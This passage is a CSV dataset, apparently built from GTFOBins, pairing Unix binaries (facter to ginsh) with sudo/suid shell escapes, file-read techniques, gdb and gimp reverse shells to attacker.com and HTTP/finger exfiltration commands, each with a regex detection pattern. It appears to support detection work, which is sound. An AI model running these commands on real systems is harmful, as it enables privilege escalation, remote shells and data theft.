sudo FACTERLIB=$TF facter","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?facter\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
file,file-read,file -f $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?file\s*\-f\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Each input line is treated as a filename for the `file` command and the output is corrupted by a suffix `:` followed by the result or the error of the operation, so this may not be suitable for binary files."
file,file-read,file -m $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?file\s*\-m\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Each line is corrupted by a prefix string and wrapped inside quotes, so this may not be suitable for binary files.

If a line in the target file begins with a `#`, it will not be printed as these lines are parsed as comments.

It can also be provided with a directory and will read each file in the directory.
"
file,suid,./file -f $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?file\s*\-f\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Each input line is treated as a filename for the `file` command and the output is corrupted by a suffix `:` followed by the result or the error of the operation, so this may not be suitable for binary files."
file,sudo,sudo file -f $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?file\s*\-f\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Each input line is treated as a filename for the `file` command and the output is corrupted by a suffix `:` followed by the result or the error of the operation, so this may not be suitable for binary files."
find,shell,find . -exec /bin/sh \; -quit,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?find\s+(?:/bin/(?:sh|bash))),
find,suid,./find . -exec /bin/sh -p \; -quit,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?find\s*\-p\s+(?:/bin/(?:sh|bash))),
find,sudo,sudo find . -exec /bin/sh \; -quit,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?find\s+(?:/bin/(?:sh|bash))),
find,file-write,"find / -fprintf ""$FILE"" DATA -quit","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?find\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","DATA is a format string, it supports some escape sequences."
finger,file-upload,"finger ""$(base64 $LFILE)@$RHOST""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?finger\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Send a binary file to a TCP port. Run `sudo nc -l -p 79 | base64 -d > ""file_to_save""` on the attacker box to collect the file. The file length is limited by the maximum size of arguments."
finger,file-download,"finger x@$RHOST | base64 -d > ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?finger\s*\-d\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Fetch remote binary file from a remote TCP port. Run `base64 ""file_to_send"" | sudo nc -l -p 79` on the attacker box to send the file."
fish,shell,fish,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?fish\s+.+),
fish,suid,./fish,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?fish\s+.+),
fish,sudo,sudo fish,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?fish\s+.+),
flock,shell,flock -u / /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?flock\s*\-u\s+(?:/bin/(?:sh|bash))),
flock,suid,./flock -u / /bin/sh -p,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?flock\s*\-u\s*\-p\s+(?:/bin/(?:sh|bash))),
flock,sudo,sudo flock -u / /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?flock\s*\-u\s+(?:/bin/(?:sh|bash))),
fmt,file-read,"fmt -pNON_EXISTING_PREFIX ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?fmt\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",This only works for the GNU version of `fmt`.
fmt,file-read,"fmt -999 ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?fmt\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",This corrupts the output by wrapping very long lines at the given width.
fmt,suid,"./fmt -999 ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?fmt\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",This corrupts the output by wrapping very long lines at the given width.
fmt,sudo,"sudo fmt -999 ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?fmt\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",This corrupts the output by wrapping very long lines at the given width.
fold,file-read,"fold -w99999999 ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?fold\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
fold,suid,"./fold -w99999999 ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?fold\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
fold,sudo,"sudo fold -w99999999 ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?fold\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
fping,file-read,fping -f $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?fping\s*\-f\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
fping,sudo,sudo fping -f $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?fping\s*\-f\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ftp,shell,"ftp
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ftp\s+(?:/bin/(?:sh|bash))),
ftp,file-upload,"ftp $RHOST
put file_to_send","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ftp\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Send local file to a FTP server.
ftp,file-download,"ftp $RHOST
get file_to_get","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ftp\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Fetch a remote file from a FTP server.
ftp,sudo,"sudo ftp
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ftp\s+(?:/bin/(?:sh|bash))),
gawk,shell,"gawk 'BEGIN {system(""/bin/sh"")}'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gawk\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:\bBEGIN\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
gawk,non-interactive-reverse-shell,"gawk -v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN {
s = ""/inet/tcp/0/"" RHOST ""/"" RPORT;
while (1) {printf ""> "" |& s; if ((s |& getline c) <= 0) break;
while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gawk\s*\-v\s*\-v\s+(?:\bBEGIN\b).*(?:\bprintf\b).*(?:\bgetline\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Run `nc -l -p 12345` on the attacker box to receive the shell.
gawk,non-interactive-bind-shell,"gawk -v LPORT=$LPORT 'BEGIN {
s = ""/inet/tcp/"" LPORT ""/0/0"";
while (1) {printf ""> "" |& s; if ((s |& getline c) <= 0) break;
while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gawk\s*\-v\s+(?:\bBEGIN\b).*(?:\bprintf\b).*(?:\bgetline\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Run `nc target.com 12345` on the attacker box to connect to the shell.
gawk,file-write,"gawk -v LFILE=$LFILE 'BEGIN { print ""DATA"" > LFILE }'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gawk\s*\-v\s+(?:\bBEGIN\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
gawk,file-read,"gawk '//' ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gawk\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
gawk,suid,"./gawk '//' ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gawk\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
gawk,sudo,"sudo gawk 'BEGIN {system(""/bin/sh"")}'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gawk\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:\bBEGIN\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
gawk,limited-suid,"./gawk 'BEGIN {system(""/bin/sh"")}'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gawk\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:\bBEGIN\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
gcc,file-read,"gcc -x c -E ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gcc\s*\-x\s*\-E\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
gcc,file-read,"gcc @""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gcc\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","The file is read and parsed as a list of files (one per line), the content is disaplyed as error messages, thus this might not be suitable to read arbitrary data."
gcc,file-write,gcc -xc /dev/null -o $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gcc\s*\-o\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
gcc,shell,"gcc -wrapper /bin/sh,-s .",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gcc\s+(?:/bin/(?:sh|bash))),
gcc,sudo,"sudo gcc -wrapper /bin/sh,-s .",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gcc\s+(?:/bin/(?:sh|bash))),
gcloud,shell,"gcloud help
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gcloud\s+(?:/bin/(?:sh|bash))),"This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
gcloud,sudo,"sudo gcloud help
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gcloud\s+(?:/bin/(?:sh|bash))),"This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
gcore,file-read,gcore $PID,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gcore\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
gcore,sudo,sudo gcore $PID,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gcore\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
gcore,suid,./gcore $PID,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gcore\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
gdb,shell,gdb -nx -ex '!sh' -ex quit,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gdb\s+.+),
gdb,reverse-shell,"export RHOST=attacker.com
export RPORT=12345
gdb -nx -ex 'python import sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv(""RHOST""),int(os.getenv(""RPORT""))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn(""/bin/sh"")' -ex quit","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gdb\s+(?:getenv\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\)).*(?:/bin/(?:sh|bash)).*(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:\bimport\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","This requires that GDB is compiled with Python support. Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell."
gdb,file-upload,"export URL=http://attacker.com/
export LFILE=file_to_send
gdb -nx -ex 'python import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
else: import urllib as u, urllib2 as r
r.urlopen(e[""URL""], bytes(u.urlencode({""d"":open(e[""LFILE""]).read()}).encode()))' -ex quit","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gdb\s+(?:\bimport\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","This requires that GDB is compiled with Python support. Send local file via ""d"" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file."
gdb,file-upload,"export LPORT=8888
gdb -nx -ex 'python import sys; from os import environ as e
if sys.version_info.major == 3: import http.server as s, socketserver as ss
else: import SimpleHTTPServer as s, SocketServer as ss
ss.TCPServer(("""", int(e[""LPORT""])), s.SimpleHTTPRequestHandler).serve_forever()' -ex quit","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gdb\s+(?:\bimport\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",This requires that GDB is compiled with Python support. Serve files in the local folder running an HTTP server.
gdb,file-download,"export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
gdb -nx -ex 'python import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve(e[""URL""], e[""LFILE""])' -ex quit","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gdb\s+(?:\bimport\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",This requires that GDB is compiled with Python support. Fetch a remote file via HTTP GET request.
gdb,file-write,"gdb -nx -ex ""dump value $LFILE \""DATA\"""" -ex quit","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gdb\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",This requires that GDB is compiled with Python support.
gdb,file-read,"gdb -nx -ex 'python print(open(""file_to_read"").read())' -ex quit","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gdb\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",This requires that GDB is compiled with Python support.
gdb,library-load,"gdb -nx -ex 'python from ctypes import cdll; cdll.LoadLibrary(""lib.so"")' -ex quit",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gdb\s+(?:\bimport\b)),This requires that GDB is compiled with Python support.
gdb,suid,"./gdb -nx -ex 'python import os; os.execl(""/bin/sh"", ""sh"", ""-p"")' -ex quit",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gdb\s+(?:/bin/(?:sh|bash)).*(?:\bimport\b)),This requires that GDB is compiled with Python support.
gdb,sudo,sudo gdb -nx -ex '!sh' -ex quit,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gdb\s+.+),
gdb,capabilities,./gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gdb\s+(?:\bimport\b)),This requires that GDB is compiled with Python support.
gem,shell,"gem open -e ""/bin/sh -c /bin/sh"" rdoc",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gem\s*\-e\s*\-c\s+(?:/bin/(?:sh|bash))),This requires the name of an installed gem to be provided (`rdoc` is usually installed).
gem,shell,"gem open rdoc
:!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gem\s+(?:/bin/(?:sh|bash))),"This invokes the default editor, which is likely to be [`vi`](/gtfobins/vi/), other functions may apply. This requires the name of an installed gem to be provided (`rdoc` is usually installed)."
gem,shell,"echo 'system(""/bin/sh"")' > $TF/x
gem build $TF/x","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gem\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",This executes the specified file as [`ruby`](/gtfobins/ruby/) code.
gem,shell,"echo 'system(""/bin/sh"")' > $TF/x
gem install --file $TF/x","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gem\s*\-\-file\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",This executes the specified file as [`ruby`](/gtfobins/ruby/) code.
gem,sudo,"sudo gem open -e ""/bin/sh -c /bin/sh"" rdoc",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gem\s*\-e\s*\-c\s+(?:/bin/(?:sh|bash))),This requires the name of an installed gem to be provided (`rdoc` is usually installed).
genie,shell,genie -c '/bin/sh',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?genie\s*\-c\s+(?:/bin/(?:sh|bash))),
genie,suid,./genie -c '/bin/sh',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?genie\s*\-c\s+(?:/bin/(?:sh|bash))),
genie,sudo,sudo genie -c '/bin/sh',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?genie\s*\-c\s+(?:/bin/(?:sh|bash))),
genisoimage,file-read,"genisoimage -q -o - ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?genisoimage\s*\-q\s*\-o\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
genisoimage,suid,"./genisoimage -sort ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?genisoimage\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","The file is parsed, and some of its content is disclosed by the error messages, thus this might not be suitable to read arbitrary data."
genisoimage,sudo,"sudo genisoimage -q -o - ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?genisoimage\s*\-q\s*\-o\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ghc,shell,"ghc -e 'System.Process.callCommand ""/bin/sh""'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ghc\s*\-e\s+(?:/bin/(?:sh|bash))),
ghc,sudo,"sudo ghc -e 'System.Process.callCommand ""/bin/sh""'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ghc\s*\-e\s+(?:/bin/(?:sh|bash))),
ghci,shell,"ghci
System.Process.callCommand ""/bin/sh""",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ghci\s+(?:/bin/(?:sh|bash))),
ghci,sudo,"sudo ghci
System.Process.callCommand ""/bin/sh""",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ghci\s+(?:/bin/(?:sh|bash))),
gimp,shell,"gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.system(""sh"")'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gimp\s*\-\-batch\-interpreter\s*\-b\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:\bimport\b))",
gimp,reverse-shell,"export RHOST=attacker.com
export RPORT=12345
gimp -idf --batch-interpreter=python-fu-eval -b 'import sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv(""RHOST""),int(os.getenv(""RPORT""))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn(""/bin/sh"")'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gimp\s*\-\-batch\-interpreter\s*\-b\s+(?:getenv\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\)).*(?:/bin/(?:sh|bash)).*(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:\bimport\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell."
gimp,file-upload,"export URL=http://attacker.com/
export LFILE=file_to_send
gimp -idf --batch-interpreter=python-fu-eval -b 'import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
else: import urllib as u, urllib2 as r
r.urlopen(e[""URL""], bytes(u.urlencode({""d"":open(e[""LFILE""]).read()}).encode()))'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gimp\s*\-\-batch\-interpreter\s*\-b\s+(?:\bimport\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Send local file via ""d"" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file."
gimp,file-upload,"export LPORT=8888
gimp -idf --batch-interpreter=python-fu-eval -b 'import sys; from os import environ as e
if sys.version_info.major == 3: import http.server as s, socketserver as ss
else: import SimpleHTTPServer as s, SocketServer as ss
ss.TCPServer(("""", int(e[""LPORT""])), s.SimpleHTTPRequestHandler).serve_forever()'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gimp\s*\-\-batch\-interpreter\s*\-b\s+(?:\bimport\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Serve files in the local folder running an HTTP server.
gimp,file-download,"export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
gimp -idf --batch-interpreter=python-fu-eval -b 'import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve(e[""URL""], e[""LFILE""])'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gimp\s*\-\-batch\-interpreter\s*\-b\s+(?:\bimport\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Fetch a remote file via HTTP GET request.
gimp,file-write,"gimp -idf --batch-interpreter=python-fu-eval -b 'open(""file_to_write"", ""wb"").write(""DATA"")'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gimp\s*\-\-batch\-interpreter\s*\-b\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
gimp,file-read,"gimp -idf --batch-interpreter=python-fu-eval -b 'print(open(""file_to_read"").read())'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gimp\s*\-\-batch\-interpreter\s*\-b\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
gimp,library-load,"gimp -idf --batch-interpreter=python-fu-eval -b 'from ctypes import cdll; cdll.LoadLibrary(""lib.so"")'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gimp\s*\-\-batch\-interpreter\s*\-b\s+(?:\bimport\b)),
gimp,suid,"./gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.execl(""/bin/sh"", ""sh"", ""-p"")'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gimp\s*\-\-batch\-interpreter\s*\-b\s+(?:/bin/(?:sh|bash)).*(?:\bimport\b)),
gimp,sudo,"sudo gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.system(""sh"")'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gimp\s*\-\-batch\-interpreter\s*\-b\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:\bimport\b))",
ginsh,shell,"ginsh
